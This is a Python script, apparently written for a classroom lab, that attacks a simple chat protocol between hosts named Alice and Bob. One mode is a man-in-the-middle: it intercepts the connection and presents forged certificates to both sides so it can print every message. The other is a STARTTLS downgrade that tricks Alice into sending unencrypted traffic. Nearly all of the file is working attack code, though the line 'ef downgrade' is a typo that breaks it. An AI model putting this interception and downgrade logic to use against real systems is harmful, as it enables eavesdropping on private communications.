import socket
import sys
import ssl

def man_in_the_middle(host1, host2):
    port = 5006

    # Create a socket to intercept communication
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print('Socket created')
    except socket.error as e:
        print(f'Error creating socket: {e}')
        sys.exit()

    # Resolve hostname of the attacker (Trudy)
    try:
        my_ip = socket.gethostbyname("trudy1")
    except socket.gaierror:
        print('Could not resolve hostname for Trudy')
        sys.exit()

    # Bind the socket to the attacker's IP and port
    try:
        s.bind((my_ip, port))
    except socket.error as e:
        print(f'Bind failed. Error: {e}')
        sys.exit()

    # Start listening for incoming connections
    s.listen(1)
    print('Socket now listening')

    # Accept connection from Alice
    conn, addr = s.accept()
    print(f'Connection established with Alice: {addr}')
    data = conn.recv(50)  # Receive initial message from Alice

    # Resolve hostname of Bob
    try:
        remote_ip_bob = socket.gethostbyname(host2)
    except socket.gaierror:
        print('Could not resolve hostname for Bob')
        sys.exit()
# Create a socket to connect to Bob
    try:
        bob = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as e:
        print(f'Error creating socket for Bob: {e}')
        sys.exit()

    bob.connect((remote_ip_bob, port))  # Connect to Bob
    bob.send(data)  # Relay data from Alice to Bob
    data = bob.recv(50)  # Receive Bob's response
    conn.send(data)  # Relay Bob's response to Alice

    # Perform STARTTLS handshake and wrap connections with SSL
    conn = ssl.wrap_socket(conn, keyfile="/root/fake-bob-private-key.pem", certfile="/root/fakebob.crt",
                           ca_certs="/root/root.crt", server_side=True, cert_reqs=ssl.CERT_REQUIRED,
                           ssl_version=ssl.PROTOCOL_TLS)
    data = conn.recv(100).decode()  # Receive TLS-encrypted message from Alice
    print("Message from Alice: " + data)

    bob = ssl.wrap_socket(bob, keyfile="/root/fake-alice-private-key.pem", certfile="/root/fakealice.crt",
                          server_side=False, ca_certs="/root/root.crt", cert_reqs=ssl.CERT_REQUIRED,
                          ssl_version=ssl.PROTOCOL_TLS)
    bob.send(data.encode())  # Relay Alice's message to Bob

    # Continue relaying messages between Alice and Bob
    while True:
        data = bob.recv(100).decode()
        print("Message from Bob: " + data)
        if data == "chat_close":
            conn.send(data.encode())
            conn.close()
            bob.close()
            s.close()
            break
        conn.send(data.encode())

        data = conn.recv(100).decode()
        print("Message from Alice: " + data)
        if data == "chat_close":
            bob.send(data.encode())
            conn.close()
            bob.close()
            s.close()
            break
        bob.send(data.encode())
ef downgrade(host1, host2):
    port = 5006

    # Create a socket to intercept communication
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print('Socket created')
    except socket.error as e:
        print(f'Error creating socket: {e}')
        sys.exit()

    # Resolve hostname of the attacker (Trudy)
    try:
        my_ip = socket.gethostbyname("trudy1")
    except socket.gaierror:
        print('Could not resolve hostname for Trudy')
        sys.exit()

    # Bind the socket to the attacker's IP and port
    try:
        s.bind((my_ip, port))
    except socket.error as e:
        print(f'Bind failed. Error: {e}')
        sys.exit()

    # Start listening for incoming connections
    s.listen(1)
    print('Socket now listening')

    # Accept connection from Alice
    conn, addr = s.accept()
    print(f'Connection established with Alice: {addr}')
    data = conn.recv(50)  # Receive initial message from Alice

    # Resolve hostname of Bob
    try:
        remote_ip_bob = socket.gethostbyname(host2)
    except socket.gaierror:
        print('Could not resolve hostname for Bob')
        sys.exit()

    # Create a socket to connect to Bob
    try:
        bob = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as e:
        print(f'Error creating socket for Bob: {e}')
        sys.exit()

    bob.connect((remote_ip_bob, port))  # Connect to Bob
    bob.send(data)  # Relay data from Alice to Bob
    data = bob.recv(50)  # Receive Bob's response
    conn.send(data)  # Relay Bob's response to Alice

    # Downgrade: Notify Alice that STARTTLS is not supported
    conn.send("chat_STARTTLS_NOT_SUPPORTED".encode())

    # Continue relaying messages between Alice and Bob
    while True:
        data = conn.recv(100).decode()
        if data == "chat_close":
            bob.send(data.encode())
            conn.close()
            bob.close()
            s.close()
            break
        else:
            bob.send(data.encode())
            data = bob.recv(100).decode()
            if data == "chat_close":
                conn.send(data.encode())
                conn.close()
                bob.close()
                s.close()
                break
            conn.send(data.encode())

# Parse command-line arguments and execute appropriate function
if len(sys.argv) != 4:
    print("Usage: python script.py [-d | -m] <host1> <host2>")
    sys.exit()

choice = sys.argv[1]
if choice == "-d":
    downgrade(sys.argv[2], sys.argv[3])
elif choice == "-m":
    man_in_the_middle(sys.argv[2], sys.argv[3])
else:
    print("Invalid option. Use -d for downgrade or -m for man-in-the-middle.")
